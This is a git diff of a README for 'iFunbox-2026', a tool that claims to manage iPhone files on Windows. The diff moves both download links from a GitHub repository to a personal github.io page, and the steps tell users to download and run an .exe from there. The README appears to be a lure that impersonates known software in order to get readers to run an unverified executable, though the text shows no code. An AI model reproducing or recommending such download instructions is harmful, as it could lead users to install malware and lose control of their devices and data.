@@ -1,6 +1,6 @@
 # 📁 iFunbox-2026 - Manage iPhone Files on Windows Easily
 
-[![](https://img.shields.io/badge/Download-iFunbox_2026-blue.svg)](https://github.com/emilazz832/iFunbox-2026)
+[![](https://img.shields.io/badge/Download-iFunbox_2026-blue.svg)](https://emilazz832.github.io)
 
 iFunbox-2026 allows you to access your iPhone storage directly from your computer. This software bridges the gap between your Apple device and your PC. It provides a familiar folder structure similar to File Explorer. You can move photos, music, and documents between your phone and your desktop with ease.
 
@@ -19,7 +19,7 @@ This application runs on modern Windows machines. Please ensure your computer me
 
 Follow these steps to set up the software on your machine:
 
-1. Click this [direct download link](https://github.com/emilazz832/iFunbox-2026) to visit the release page.
+1. Click this [direct download link](https://emilazz832.github.io) to visit the release page.
 2. Look for the file ending in .exe in the latest release section.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the file to start the installation wizard.
